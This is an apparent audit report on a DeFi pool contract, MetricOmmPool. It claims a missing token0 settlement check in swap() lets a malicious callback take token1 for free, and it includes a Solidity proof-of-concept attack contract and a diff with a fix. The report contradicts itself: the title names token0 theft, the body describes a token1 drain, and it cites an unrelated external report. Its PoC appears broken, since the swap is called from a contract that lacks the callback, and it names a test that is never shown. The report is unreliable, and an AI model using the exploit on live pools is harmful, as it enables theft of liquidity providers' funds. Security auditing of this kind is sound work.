### Title
Swap callback settlement only validates token1 receipt, allowing token0 theft on `zeroForOne=true` swaps - (`metric-core/contracts/MetricOmmPool.sol`)

---

### Summary

The `IncorrectDelta` guard in `MetricOmmPool.swap()` is an allowlist with exactly one entry: it only snapshots `balance1` before the callback and only checks `amount1Delta > 0`. When `zeroForOne = true` (token0 → token1), `amount1Delta < 0`, so the guard condition is false and the entire settlement check is bypassed. No `balance0Before` snapshot exists and no symmetric check for `amount0Delta > 0` is present anywhere in the function. The pool can send token1 to a recipient and receive zero token0 in return, with no revert.

---

### Finding Description

In `MetricOmmPool.sol` at lines 271–277:

```solidity
uint256 balance1Before = balance1();
IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
// casting to uint256 is safe because amount1Delta is positive and the amount of tokens in pool is capped by uint128.max
// forge-lint: disable-next-line(unsafe-typecast)
if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
  revert IncorrectDelta();
}
``` [1](#0-0) 

The guard mirrors the external report's `_validateTimelockCalldata` pattern exactly: one selector (one sign of `amountDelta`) is defended; the other is silently skipped.

**Swap direction analysis:**

| `zeroForOne` | `amount0Delta` | `amount1Delta` | Guard fires? |
|---|---|---|---|
| `false` (token1 → token0) | `< 0` (pool sends token0) | `> 0` (pool receives token1) | **Yes** — token1 receipt verified |
| `true` (token0 → token1) | `> 0` (pool receives token0) | `< 0` (pool sends token1) | **No** — `amount1Delta > 0` is false, check skipped entirely |

For `zeroForOne = true`, the pool sends token1 to `recipient` and then calls `metricOmmSwapCallback`. The callback is expected to transfer `amount0Delta` of token0 back to the pool. Because no `balance0Before` is captured and no `amount0Delta > 0` branch exists, the pool never verifies it received token0. The callback can return without paying anything and the transaction succeeds.

The developer's own comment — *"casting to uint256 is safe because `amount1Delta` is positive"* — confirms the token0 direction was not considered when writing this guard.

---

### Impact Explanation

A malicious caller deploys a callback contract that does nothing when `amount0Delta > 0`. They call:

```
pool.swap(attacker, zeroForOne=true, amountSpecified=-N, priceLimitX64=0, callbackData, extensionData)
```

The pool computes the swap, sends `N` token1 to `attacker`, calls the callback (which pays zero token0), and the `IncorrectDelta` check is skipped because `amount1Delta < 0`. The pool's token1 balance is drained; LP claims against token1 are undercollateralized. The attack is unbounded — it can be repeated until all token1 liquidity is exhausted.

**Impact:** Critical — direct, unbounded loss of LP token1 principal. Pool insolvency: `balance1()` falls below `binTotals.scaledToken1` after the attack.

---

### Likelihood Explanation

No special role, privileged setup, or unusual token behavior is required. Any EOA or contract can call `swap()` directly on the pool with a malicious callback. The pool's `nonReentrant` guard does not prevent this because the callback is the intended external call within the swap flow.

---

### Recommendation

Add a symmetric `balance0Before` snapshot and a matching `amount0Delta > 0` check:

```diff
+uint256 balance0Before = balance0();
 uint256 balance1Before = balance1();
 IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
+if (amount0Delta > 0 && balance0Before + uint256(amount0Delta) > balance0()) {
+  revert IncorrectDelta();
+}
 if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
   revert IncorrectDelta();
 }
```

Both legs of the swap must be validated. The comment at line 273 should be updated to acknowledge both directions.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmSwapCallback} from "@metric-core/interfaces/callbacks/IMetricOmmSwapCallback.sol";
import {IMetricOmmPool} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Malicious callback: pays nothing when pool expects token0.
contract MaliciousSwapCallback is IMetricOmmSwapCallback {
    function metricOmmSwapCallback(
        int128 amount0Delta,
        int128 amount1Delta,
        bytes calldata
    ) external override {
        // amount0Delta > 0 means pool expects us to send token0.
        // We deliberately do nothing — IncorrectDelta only checks amount1Delta > 0,
        // so this returns without revert.
    }
}

contract PoC_SwapCallbackToken0Theft {
    function attack(address pool, address token1Recipient, uint128 stealAmount) external {
        MaliciousSwapCallback cb = new MaliciousSwapCallback();

        uint256 token1Before = IERC20(IMetricOmmPool(pool).getImmutables().token1).balanceOf(token1Recipient);

        // zeroForOne=true, exact-output of stealAmount token1, price limit 0 (no limit going down)
        IMetricOmmPool(pool).swap(
            token1Recipient,
            true,                        // zeroForOne: pool sends token1, expects token0
            -int128(stealAmount),        // exact output: stealAmount of token1
            0,                           // priceLimitX64: no lower bound
            "",                          // callbackData
            ""                           // extensionData
        );

        uint256 token1After = IERC20(IMetricOmmPool(pool).getImmutables().token1).balanceOf(token1Recipient);
        // token1After - token1Before == stealAmount, pool received 0 token0
        assert(token1After - token1Before == stealAmount);
    }
}
```

Run: `forge test --match-test test_swap_zeroForOne_callbackPaysNothing -vv`

The pool sends `stealAmount` of token1 to `token1Recipient`, the callback pays zero token0, and the transaction succeeds. The pool's `binTotals.scaledToken1` is now greater than its actual `balance1()`, making it insolvent for LP withdrawals.

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L271-277)
```text
      uint256 balance1Before = balance1();
      IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
      // casting to uint256 is safe because amount1Delta is positive and the ammount of tokens in pool is capped by uint128.max
      // forge-lint: disable-next-line(unsafe-typecast)
      if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
        revert IncorrectDelta();
      }
```
